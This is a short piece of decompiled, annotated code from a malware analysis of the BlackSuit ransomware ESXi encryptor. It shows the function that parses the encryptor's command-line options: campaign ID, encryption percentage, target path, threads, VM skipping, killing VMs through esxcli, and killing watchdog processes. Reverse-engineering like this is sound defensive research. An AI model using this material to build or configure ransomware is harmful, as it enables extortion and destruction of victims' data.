////////////////////////////////////////////////////////////
// Blacksuit Encryptor
// https://www.shadowstackre.com/analysis/blacksuit-ransomware-esxi
//
// Technique: Mitre Command and Scripting Interpreter
// URL: https://attack.mitre.org/techniques/T1059/
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////

// The following function will parse the program arguments passed to the encryptor.  
// For any argument not present, a default value will be set.
__int64 __fastcall parseArguments(int argc, char **argv)
{
  int i; // [rsp+1Ch] [rbp-4h]

  if ( argc <= 2 )
    return 0LL;
  for ( i = 1; i < argc; ++i )
  {
    if ( !strcmp(argv[i], "-name") )
    {
      if ( !argv[++i] )
        return 0LL;
      std::string::operator=(&id, argv[i]);
      std::string::append((std::string *)&readme_text, (const std::string *)&id);// ID to identify the campaign / target
    }
    else if ( !strcmp(argv[i], "-percent") )
    {
      if ( argv[++i] )
        encryptPercentage = atoi(argv[i]);      // Percentage of the file to encrypt
    }
    else if ( !strcmp(argv[i], "-p") )
    {
      if ( !argv[++i] )
        return 0LL;
      std::string::operator=(&path, argv[i]);   // Path for file discovery
    }
    else if ( !strcmp(argv[i], "-thrcount") )   // Amount of threads to create for the encryption thread pool
    {
      if ( !argv[++i] )
        return 0LL;
      threads_count = atoi(argv[i]);
    }
    else if ( !strcmp(argv[i], "-skip") )
    {
      lstVmSkipID = (char *)get_buff_skip(argv[++i]);// When evaluating VM's, identify the VM world ID that you wish to skip over
    }
    else if ( !strcmp(argv[i], "-killvm") )
    {
      stopvm = 1;                               // Stop the VM using the esxcli kill command
    }
    else if ( !strcmp(argv[i], "-allfiles") )
    {
      vmonly = 0;                               // Identify VM only files or all files
    }
    else if ( !strcmp(argv[i], "-noprotect") )
    {
      noprotect = 1;                            // Check if the encryptor is already running
    }
    else if ( !strcmp(argv[i], "-vmsyslog") )
    {
      on_vmsyslog = 1;                          // Determine if VM watch dog processes are killed
    }
    else
    {
      if ( strcmp(argv[i], "-demonoff") )
        return 0LL;
      demonoff = 1;                             // Enable or disable the demon process
    }
  }
  if ( std::string::length((std::string *)&id) != 32LL )  // IDs are 32 in length
    return 0LL;
  if ( (unsigned int)encryptPercentage >= 0x65 )// Error if encrypt percentage is greater than 100% percent
    return 0LL;
  if ( !encryptPercentage )
    encryptPercentage = 50;                     // Default of 50% encrypt percentage
  return 1LL;
}